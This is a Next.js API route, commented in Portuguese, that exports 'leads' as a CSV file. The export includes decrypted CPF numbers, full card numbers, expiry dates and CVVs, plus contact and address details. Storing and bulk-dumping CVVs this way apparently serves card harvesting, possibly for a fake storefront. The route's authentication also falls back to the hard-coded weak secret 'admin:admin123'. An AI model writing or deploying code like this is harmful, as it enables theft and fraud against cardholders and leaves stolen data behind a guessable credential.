import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { decrypt } from "@/lib/crypto";

// Força a Vercel a tratar esta rota estritamente como dinâmica (não tenta pré-renderizar no build)
export const dynamic = "force-dynamic";

export async function GET(req: NextRequest) {
  const auth = req.headers.get("x-admin-auth");
  const adminSecret = process.env.ADMIN_AUTH_SECRET || "admin:admin123";

  if (auth !== adminSecret) {
    return NextResponse.json({ error: "Não autorizado" }, { status: 401 });
  }

  try {
    const leads = await prisma.lead.findMany({
      orderBy: { dataCriacao: "desc" },
    });

    const headers = [
      "ID",
      "Nome",
      "Email",
      "Telefone",
      "CPF",
      "NumeroCartao",
      "Validade",
      "CVV",
      "Cor",
      "Quantidade",
      "TotalPago",
      "CEP",
      "Endereco",
      "Cidade",
      "Estado",
      "DataCriacao",
    ];

    const escapeCsv = (val: string | number | null | undefined) => {
      if (val === null || val === undefined) return '""';
      const str = String(val).replace(/"/g, '""');
      return `"${str}"`;
    };

    const rows = leads.map((l) => [
      l.id,
      escapeCsv(l.nome),
      escapeCsv(l.email),
      escapeCsv(l.telefone),
      escapeCsv(decrypt(l.cpf)),
      escapeCsv(decrypt(l.numeroCartao)),
      escapeCsv(l.validade),
      escapeCsv(decrypt(l.cvv)),
      escapeCsv(l.corSelecionada),
      l.quantidade,
      l.totalPago,
      escapeCsv(l.cep),
      escapeCsv(l.endereco),
      escapeCsv(l.cidade),
      escapeCsv(l.estado),
      escapeCsv(l.dataCriacao ? l.dataCriacao.toISOString() : ""),
    ]);

    const csvContent = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
    
    // Adiciona o BOM (\uFEFF) para garantir que o Excel abra os acentos corretamente
    const csvWithBom = "\uFEFF" + csvContent;

    return new NextResponse(csvWithBom, {
      status: 200,
      headers: {
        "Content-Type": "text/csv; charset=utf-8",
        "Content-Disposition": `attachment; filename="leads-${new Date().toISOString().slice(0, 10)}.csv"`,
      },
    });
  } catch (error) {
    console.error("Export error:", error);
    return NextResponse.json({ error: "Erro ao exportar dados" }, { status: 500 });
  }
}